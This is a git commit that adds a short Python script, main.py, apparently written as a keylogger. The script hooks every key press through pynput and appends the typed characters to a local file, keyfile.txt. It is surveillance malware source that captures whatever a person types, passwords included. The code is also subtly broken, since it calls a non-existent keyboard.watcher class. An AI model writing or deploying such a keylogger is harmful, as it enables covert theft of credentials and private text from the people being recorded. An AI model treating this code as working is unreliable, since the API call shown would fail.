80cdfb4fa2da9ff7a714fba764d3e86045497169
Yazan Moussa <yazan.mousa159@gmail.com>
2025-04-15 00:07:22 -0400

    Create main.py

---
+++ main.py
@@ -0,0 +1,15 @@
+from pynput import keyboard
+
+def keyClicked(key):
+    print(str(key))
+    with open("keyfile.txt", 'a') as logKey:
+        try:
+            char = key.char
+            logKey.write(char)
+        except:
+            print("Error getting char")
+
+if __name__ == "__main__":
+    watcher = keyboard.watcher(on_press=keyClicked)
+    watcher.start()
+    input()
